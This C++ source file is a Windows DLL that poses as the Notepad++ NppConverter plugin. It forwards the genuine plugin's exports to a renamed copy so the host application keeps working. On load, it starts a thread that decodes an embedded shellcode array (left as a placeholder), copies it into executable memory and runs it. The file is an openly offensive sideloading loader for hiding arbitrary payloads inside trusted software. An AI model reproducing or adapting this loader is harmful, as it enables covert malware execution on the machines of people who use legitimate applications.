#include <windows.h>
#include <Shellapi.h>
#include <tchar.h>
#include "pch.h"
#include <stdio.h>
#include <thread>

// notepad++ NPPConverter
#pragma comment(linker, "/export:beNotified=NppConverter2.beNotified")
#pragma comment(linker, "/export:getFuncsArray=NppConverter2.getFuncsArray")
#pragma comment(linker, "/export:getName=NppConverter2.getName")
#pragma comment(linker, "/export:isUnicode=NppConverter2.isUnicode")
#pragma comment(linker, "/export:messageProc=NppConverter2.messageProc")
#pragma comment(linker, "/export:setInfo=NppConverter2.setInfo")

void Hook_Init();
std::thread hookthread;
char obfs[] = <shellcode here>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH: {

		// Create a thread and close the handle as we do not want to use it to wait for it 
		hookthread = std::thread(Hook_Init);
	}
	case DLL_PROCESS_DETACH:
		hookthread.detach();
		// Code to run when the DLL is freed
		break;

	case DLL_THREAD_ATTACH:
		// Code to run when a thread is created during the DLL's lifetime
		break;

	case DLL_THREAD_DETACH:
		// Code to run when a thread ends normally.
		break;
	}
	return TRUE;
}

void Hook_Init()
{
	 char shellcode[928];
	 for (int i = 0; i < 928; i++) {
		 shellcode[i] = obfs[i] // ^ 30; if using xor with single nubmer
	 }
	void* pShellcode;
	HANDLE hProcess = GetCurrentProcess();

	pShellcode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(pShellcode, shellcode, sizeof(shellcode));

	int (*func)();
	func = (int (*)()) pShellcode;
	(*func)();
}
